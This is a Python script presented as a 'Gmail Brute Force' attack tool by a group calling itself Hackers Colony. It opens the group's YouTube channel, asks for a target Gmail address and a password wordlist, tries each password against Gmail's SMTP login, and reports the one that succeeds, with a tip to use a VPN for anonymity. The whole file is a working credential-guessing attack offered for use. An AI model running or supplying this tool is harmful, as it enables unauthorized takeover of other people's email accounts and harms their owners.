#!/usr/bin/env python3
import os
import sys
import time
import smtplib

# Clear the terminal
os.system("clear")

# Animation function
def animate(text):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.008)

# Welcome screen ASCII Art
banner = '''\033[1;32m

                           ██╗  ██╗ ██████╗ ██████╗
                           ██║  ██║██╔════╝██╔═══██╗
                           ███████║██║     ██║   ██║
                           ██╔══██║██║     ██║   ██║
                           ██║  ██║╚██████╗╚██████╔╝
                           ╚═╝  ╚═╝ ╚═════╝ ╚═════╝

\033[1;33m

               
                   ██████╗ ██████╗ ██╗   ██╗████████╗██╗  ██╗
                   ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝╚██╗██╔╝
                   ██████╔╝██████╔╝██║   ██║   ██║    ╚███╔╝ 
                   ██╔══██╗██╔══██╗██║   ██║   ██║    ██╔██╗ 
                   ██████╔╝██║  ██║╚██████╔╝   ██║   ██╔╝ ██╗
                   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝
                                          



\033[1;31m           :: G M A I L  B R U T E  F O R C E - By Hackers Colony ::
\033[0m
'''
animate(banner)

# Disclaimer and redirect notice
notice = ("\n\033[1;34mThis Tool is Free For Our subscribers\n"
         "We are Redirecting You To Our YouTube Channel\n"
         "You Will Subscribe Our Channel\n"
         "After Doing It You Will Able To Use Our Tool.\n\033[0m")
animate(notice)
# Uncomment to open the YouTube channel
time.sleep(5)
os.system(f"xdg-open https://youtube.com/@hackers_colony_tech?si=7FEalwT2t0khmivd")
time.sleep(7)

# Clear screen before showing logo
os.system("clear")

# Program Logo
logo = '''\033[1;32m

                 /$$$$$$$                        /$$     /$$   /$$
                | $$__  $$                      | $$    | $$  / $$
                | $$  \ $$  /$$$$$$  /$$   /$$ /$$$$$$  |  $$/ $$/
                | $$$$$$$  /$$__  $$| $$  | $$|_  $$_/   \  $$$$/ 
                | $$__  $$| $$  \__/| $$  | $$  | $$      >$$  $$ 
                | $$  \ $$| $$      | $$  | $$  | $$ /$$ /$$/\  $$
                | $$$$$$$/| $$      |  $$$$$$/  |  $$$$/| $$  \ $$
                |_______/ |__/       \______/    \___/  |__/  |__/                                                       


                    /$$$$$$                          /$$ /$$
                   /$$__  $$                        |__/| $$
                  | $$  \__/ /$$$$$$/$$$$   /$$$$$$  /$$| $$
                  | $$ /$$$$| $$_  $$_  $$ |____  $$| $$| $$
                  | $$|_  $$| $$ \ $$ \ $$  /$$$$$$$| $$| $$
                  | $$  \ $$| $$ | $$ | $$ /$$__  $$| $$| $$
                  |  $$$$$$/| $$ | $$ | $$|  $$$$$$$| $$| $$
                   \______/ |__/ |__/ |__/ \_______/|__/|__/
                             
                                                                            
          
            \033[1;34m     .:H a c k e r  C o l o n y  O f f i c i a l:.

                       __Gmail BruteForce Attack Tool__

'''
animate(logo)

# Instructions and notices
dictr = "\033[1;32m\n[+] Ensure the wordlist is in the same directory as this script.\n"
vpnu = "[+] Use VPN for better anonymity.\n\033[0m\n\n"

animate(dictr)
animate(vpnu)

try:
    # SMTP initialization
    smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
    smtpserver.ehlo()
    smtpserver.starttls()

    # Get user inputs
    user = input("\033[1;36mEnter target Gmail ID: \033[0m")

    # Wordlist selection
    print("\033[1;36m\nChoose a wordlist:\033[0m\n")
    print("\033[1;31m1. Your Wordlist")
    print("\033[1;31m2. HCO Wordlist\n")
    
    choice = input("\033[1;36mEnter your choice (1 or 2): \033[0m")
    
    if choice == "1":
        passwf_path = input("\033[1;36mEnter path to your custom wordlist: \033[0m")
    elif choice == "2":
        passwf_path = "hcowordlist.txt"  # Default HCO wordlist path
        print("\033[1;33mUsing HCO wordlist: 'hcowordlist.txt'\033[0m")
    else:
        print("\033[1;31mInvalid choice. Exiting...\033[0m")
        exit()

    # Validate wordlist file existence
    try:
        passwf = open(passwf_path, "r")
    except FileNotFoundError:
        print(f"\033[1;31mError: Password file '{passwf_path}' not found.\033[0m")
        exit()

    # Brute force loop
    for password in passwf:
        password = password.strip()  # Remove whitespace
        try:
            smtpserver.login(user, password)
            print(f"\033[1;32m[+] Voila! Password found: {password}\033[0m")
            break
        except smtplib.SMTPAuthenticationError as e:
            error = str(e)
            if "534" in error or "5.7.8" in error:
                print("\033[1;31m[!] Authentication failed: Gmail security blocked the attempt.\033[0m")
                break
            else:
                print(f"\033[1;31m[-] Password not found: {password}\033[0m")
        except Exception as ex:
            print(f"\033[1;31mAn error occurred: {ex}\033[0m")
            break

except KeyboardInterrupt:
    print("\n\033[1;31m[!] Program interrupted by the user. Exiting...\033[0m")
except Exception as smtp_error:
    print(f"\033[1;31mError: {smtp_error}\033[0m")